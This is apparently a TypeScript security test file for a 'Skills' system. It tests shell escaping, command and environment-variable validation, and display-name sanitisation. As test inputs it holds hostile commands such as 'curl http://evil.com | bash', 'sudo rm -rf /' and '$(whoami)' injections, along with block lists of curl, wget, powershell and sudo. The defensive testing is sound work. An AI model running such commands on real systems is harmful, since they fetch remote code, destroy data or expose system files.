/**
 * Skill Services Security Tests
 *
 * Tests for security-critical functionality in the Skills system:
 * - Shell argument escaping (shell-escape.ts)
 * - Command validation (SkillInstaller.validateCommand)
 * - Safe YAML parsing (SkillRegistry)
 * - Environment variable name validation
 */

import * as assert from "assert";
import * as sinon from "sinon";
import * as os from "os";
import {
  escapeShellArg,
  escapeShellArgWindows,
  escapeShellArgPlatform,
  escapeShellArgs,
  buildSafeCommand,
  isSafeCommandName,
  isValidEnvVarName,
  buildEnvExports,
} from "../../services/skill/shell-escape";

suite("Shell Escape Utility — Security Tests", () => {
  suite("escapeShellArg (Unix/macOS)", () => {
    test("escapes single quotes correctly", () => {
      assert.strictEqual(escapeShellArg("test'value"), "'test'\\''value'");
    });

    test("wraps simple strings in single quotes", () => {
      assert.strictEqual(escapeShellArg("hello"), "'hello'");
    });

    test("handles empty string", () => {
      assert.strictEqual(escapeShellArg(""), "''");
    });

    test("escapes command substitution attempts", () => {
      const malicious = "$(rm -rf /)";
      const escaped = escapeShellArg(malicious);
      // Should be safely quoted, not executable
      assert.ok(escaped.startsWith("'"));
      assert.ok(escaped.endsWith("'"));
      assert.ok(!escaped.includes("$("));
    });

    test("escapes backtick command substitution", () => {
      const malicious = "`rm -rf /`";
      const escaped = escapeShellArg(malicious);
      assert.ok(escaped.startsWith("'"));
    });

    test("handles newlines safely", () => {
      const withNewline = "line1\nline2";
      const escaped = escapeShellArg(withNewline);
      assert.ok(escaped.startsWith("'"));
    });

    test("handles special shell characters", () => {
      const special = "test;whoami|cat /etc/passwd";
      const escaped = escapeShellArg(special);
      assert.ok(escaped.startsWith("'"));
      assert.ok(escaped.endsWith("'"));
    });

    test("escapes glob patterns", () => {
      const glob = "*.txt";
      const escaped = escapeShellArg(glob);
      assert.strictEqual(escaped, "'*.txt'");
    });

    test("handles environment variable injection", () => {
      const envInjection = "$HOME";
      const escaped = escapeShellArg(envInjection);
      assert.ok(escaped.startsWith("'"));
    });
  });

  suite("escapeShellArgWindows", () => {
    test("wraps in double quotes", () => {
      assert.strictEqual(escapeShellArgWindows("test"), '"test"');
    });

    test("escapes internal double quotes", () => {
      assert.strictEqual(escapeShellArgWindows('test"value'), '"test\\"value"');
    });

    test("handles empty string", () => {
      assert.strictEqual(escapeShellArgWindows(""), '""');
    });

    test("handles backslashes before quotes", () => {
      const input = 'path\\to\\"file';
      const escaped = escapeShellArgWindows(input);
      assert.ok(escaped.startsWith('"'));
      assert.ok(escaped.endsWith('"'));
    });
  });

  suite("escapeShellArgPlatform", () => {
    test("uses correct escaping based on platform", () => {
      const result = escapeShellArgPlatform("test");
      if (os.platform() === "win32") {
        assert.strictEqual(result, '"test"');
      } else {
        assert.strictEqual(result, "'test'");
      }
    });
  });

  suite("escapeShellArgs (multiple arguments)", () => {
    test("escapes array of arguments", () => {
      const args = ["arg1", "arg with space", "arg'quote"];
      const escaped = escapeShellArgs(args);
      assert.strictEqual(escaped.length, 3);
      assert.ok(escaped[0].includes("arg1"));
      assert.ok(escaped[1].includes("arg with space"));
    });

    test("handles empty array", () => {
      const escaped = escapeShellArgs([]);
      assert.strictEqual(escaped.length, 0);
    });
  });

  suite("buildSafeCommand", () => {
    test("builds command with escaped arguments", () => {
      const cmd = buildSafeCommand("echo", ["hello", "world"]);
      assert.ok(cmd.startsWith("echo "));
    });

    test("handles arguments with special characters", () => {
      const cmd = buildSafeCommand("echo", ["hello; rm -rf /"]);
      // The malicious part should be safely escaped
      assert.ok(cmd.includes("'"));
    });
  });
});

suite("Shell Escape Utility — Command Validation", () => {
  suite("isSafeCommandName", () => {
    test("allows simple command names", () => {
      assert.strictEqual(isSafeCommandName("npm"), true);
      assert.strictEqual(isSafeCommandName("pip"), true);
      assert.strictEqual(isSafeCommandName("python3"), true);
    });

    test("rejects commands with path separators", () => {
      assert.strictEqual(isSafeCommandName("/usr/bin/bash"), false);
      assert.strictEqual(isSafeCommandName("../evil"), false);
      assert.strictEqual(isSafeCommandName("./script.sh"), false);
    });

    test("rejects commands with shell metacharacters", () => {
      assert.strictEqual(isSafeCommandName("npm;whoami"), false);
      assert.strictEqual(isSafeCommandName("npm|cat"), false);
      assert.strictEqual(isSafeCommandName("npm&bg"), false);
    });

    test("rejects commands with backticks", () => {
      assert.strictEqual(isSafeCommandName("`whoami`"), false);
    });

    test("rejects commands with command substitution", () => {
      assert.strictEqual(isSafeCommandName("$(whoami)"), false);
    });

    test("rejects empty command", () => {
      assert.strictEqual(isSafeCommandName(""), false);
    });

    test("rejects whitespace-only command", () => {
      assert.strictEqual(isSafeCommandName("   "), false);
    });

    test("allows hyphenated commands", () => {
      assert.strictEqual(isSafeCommandName("brew-cask"), true);
    });

    test("allows underscored commands", () => {
      assert.strictEqual(isSafeCommandName("my_script"), true);
    });
  });

  suite("isValidEnvVarName", () => {
    test("allows valid env var names", () => {
      assert.strictEqual(isValidEnvVarName("PATH"), true);
      assert.strictEqual(isValidEnvVarName("MY_VAR"), true);
      assert.strictEqual(isValidEnvVarName("_PRIVATE"), true);
      assert.strictEqual(isValidEnvVarName("VAR123"), true);
    });

    test("rejects names starting with numbers", () => {
      assert.strictEqual(isValidEnvVarName("123VAR"), false);
    });

    test("rejects names with special characters", () => {
      assert.strictEqual(isValidEnvVarName("MY-VAR"), false);
      assert.strictEqual(isValidEnvVarName("MY.VAR"), false);
      assert.strictEqual(isValidEnvVarName("MY VAR"), false);
    });

    test("rejects empty names", () => {
      assert.strictEqual(isValidEnvVarName(""), false);
    });

    test("rejects names with shell metacharacters", () => {
      assert.strictEqual(isValidEnvVarName("VAR;whoami"), false);
      assert.strictEqual(isValidEnvVarName("VAR$(cmd)"), false);
    });
  });

  suite("buildEnvExports", () => {
    test("builds export statements for valid env vars", () => {
      const env = { API_KEY: "secret123", DEBUG: "true" };
      const exports = buildEnvExports(env);
      assert.ok(exports.includes("export API_KEY="));
      assert.ok(exports.includes("export DEBUG="));
    });

    test("escapes values with special characters", () => {
      const env = { VALUE: "test'value" };
      const exports = buildEnvExports(env);
      // Value should be escaped
      assert.ok(exports.includes("'"));
    });

    test("filters out invalid env var names", () => {
      const env = { VALID_VAR: "ok", "123INVALID": "bad", "VAR;CMD": "bad" };
      const exports = buildEnvExports(env);
      assert.ok(exports.includes("VALID_VAR"));
      assert.ok(!exports.includes("123INVALID"));
      assert.ok(!exports.includes("VAR;CMD"));
    });

    test("handles empty env object", () => {
      const exports = buildEnvExports({});
      assert.strictEqual(exports, "");
    });

    test("prevents command injection via env var values", () => {
      const env = { MALICIOUS: "$(whoami)" };
      const exports = buildEnvExports(env);
      // The value should be escaped, not executable
      assert.ok(exports.includes("'$(whoami)'") || exports.includes("'\\$(whoami)'"));
    });
  });
});

suite("Skill System — Command Injection Prevention", () => {
  // These tests verify the command validation patterns used in SkillInstaller
  
  const DANGEROUS_PATTERNS = [
    // Path traversal
    "../",
    "..\\",
    // Dangerous commands
    "rm -rf",
    "rm -fr",
    "rmdir /s",
    "del /f",
    "format",
    // Shell injection
    "eval ",
    "exec ",
    "; ",
    "&& ",
    "|| ",
    "| ",
    // Command substitution
    "$()",
    "`",
    // Environment manipulation
    "export ",
    "set ",
    // Network/download commands (without context)
    "curl ",
    "wget ",
    "powershell",
    "cmd.exe",
  ];

  const FORBIDDEN_PATTERNS = [
    "sudo",
    "su -",
    "chmod 777",
    "chown root",
  ];

  /**
   * Simple command validation matching SkillInstaller logic
   */
  function validateCommand(command: string): { valid: boolean; reason?: string } {
    const lowerCmd = command.toLowerCase();

    for (const pattern of FORBIDDEN_PATTERNS) {
      if (lowerCmd.includes(pattern)) {
        return { valid: false, reason: `Forbidden pattern: ${pattern}` };
      }
    }

    let dangerousCount = 0;
    for (const pattern of DANGEROUS_PATTERNS) {
      if (lowerCmd.includes(pattern.toLowerCase())) {
        dangerousCount++;
      }
    }

    if (dangerousCount >= 2) {
      return { valid: false, reason: "Multiple dangerous patterns detected" };
    }

    return { valid: true };
  }

  test("rejects path traversal attacks", () => {
    const result = validateCommand("cd ../../../etc; cat passwd");
    assert.strictEqual(result.valid, false);
  });

  test("rejects sudo commands", () => {
    const result = validateCommand("sudo rm -rf /");
    assert.strictEqual(result.valid, false);
    assert.ok(result.reason?.includes("Forbidden"));
  });

  test("rejects su commands", () => {
    const result = validateCommand("su - root -c 'rm -rf /'");
    assert.strictEqual(result.valid, false);
  });

  test("rejects chmod 777", () => {
    const result = validateCommand("chmod 777 /etc/passwd");
    assert.strictEqual(result.valid, false);
  });

  test("rejects multiple dangerous patterns", () => {
    // curl + | (pipe) = 2 dangerous patterns
    const result = validateCommand("curl http://evil.com | bash");
    assert.strictEqual(result.valid, false);
  });

  test("allows safe npm commands", () => {
    const result = validateCommand("npm install lodash");
    assert.strictEqual(result.valid, true);
  });

  test("allows safe pip commands", () => {
    const result = validateCommand("pip install requests");
    assert.strictEqual(result.valid, true);
  });

  test("rejects eval-based attacks", () => {
    const result = validateCommand("echo test && eval 'whoami'");
    assert.strictEqual(result.valid, false);
  });

  test("rejects powershell execution", () => {
    const result = validateCommand("powershell -ExecutionPolicy Bypass -File evil.ps1");
    assert.strictEqual(result.valid, false);
  });
});

suite("Skill System — Terminal Name Sanitization", () => {
  /**
   * Simple sanitization matching SkillInstaller logic
   */
  function sanitizeDisplayName(name: string): string {
    return name
      .replace(/[^\w\s-]/g, "") // Remove special characters
      .substring(0, 50) // Limit length
      .trim();
  }

  test("removes special characters", () => {
    const result = sanitizeDisplayName("Test<script>alert(1)</script>");
    assert.strictEqual(result, "Testscriptalert1script");
  });

  test("preserves alphanumeric and spaces", () => {
    const result = sanitizeDisplayName("My Skill Setup");
    assert.strictEqual(result, "My Skill Setup");
  });

  test("preserves hyphens", () => {
    const result = sanitizeDisplayName("my-skill-setup");
    assert.strictEqual(result, "my-skill-setup");
  });

  test("truncates long names", () => {
    const longName = "A".repeat(100);
    const result = sanitizeDisplayName(longName);
    assert.strictEqual(result.length, 50);
  });

  test("handles empty string", () => {
    const result = sanitizeDisplayName("");
    assert.strictEqual(result, "");
  });

  test("removes command injection attempts", () => {
    const result = sanitizeDisplayName("Skill $(whoami)");
    assert.strictEqual(result, "Skill whoami");
  });

  test("removes backtick injection", () => {
    const result = sanitizeDisplayName("Skill `id`");
    assert.strictEqual(result, "Skill id");
  });
});
